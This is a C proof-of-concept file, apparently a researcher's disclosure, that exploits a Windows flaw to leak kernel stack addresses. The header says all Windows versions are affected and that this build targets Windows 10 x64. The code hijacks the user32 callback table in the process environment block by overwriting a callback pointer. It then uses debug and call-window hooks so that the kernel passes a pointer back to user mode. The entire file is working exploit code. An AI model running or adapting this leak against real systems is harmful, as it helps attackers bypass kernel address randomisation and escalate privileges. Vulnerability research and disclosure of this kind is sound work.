//
// Gil Dabah August 2019
// All Windows versions affected.
// This POC is for Windows 10 x64.
// The debughook struct thunk function doesn't omit the kernel lparam address,
// before passing it to usermode.
// So basically debug hook can leak any other hook kernel lparam pointer.
//

#include <stdio.h>
#include <windows.h>

HWND g_hWnd = NULL;

#define __fnHkINLPDEBUGHOOKSTRUCT_NO 43

LRESULT CALLBACK __fnHkINLPDEBUGHOOKSTRUCT(ULONG_PTR a)
{
	printf("Leaked kernel stack address of CWPSTRUCT: %I64x\n", *(ULONG_PTR*)(a + 24));
	Sleep(5000);
	ExitProcess(0);
	return 0;
}

LRESULT CALLBACK cwpHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	return 0;
}

LRESULT CALLBACK dbgHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	return 0;
}

DWORD CALLBACK threadProc(LPVOID)
{
	SendMessage(g_hWnd, WM_NULL, 0xaabb, 0xccdd);
	return 0;
}

ULONG_PTR GetPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* GetUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)GetPEB() + 0x58);
}

int main()
{
	g_hWnd = CreateWindow("button", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	if (NULL == g_hWnd)
	{
		printf("Can't create window\n");
		return 1;
	}
	if (!CreateThread(NULL, 0, threadProc, NULL, 0, NULL))
	{
		printf("Can't create thread\n");
		return 2;
	}

	SetWindowsHookEx(WH_CALLWNDPROC, cwpHookProc, NULL, GetCurrentThreadId());
	SetWindowsHookEx(WH_DEBUG, dbgHookProc, NULL, GetCurrentThreadId());

	ULONG_PTR* ptrAddr = &GetUser32Callbacks()[__fnHkINLPDEBUGHOOKSTRUCT_NO];
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)__fnHkINLPDEBUGHOOKSTRUCT;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);

	MSG msg;
	GetMessage(&msg, NULL, 0, 0);
	GetMessage(&msg, NULL, 0, 0);

	return 0;
}
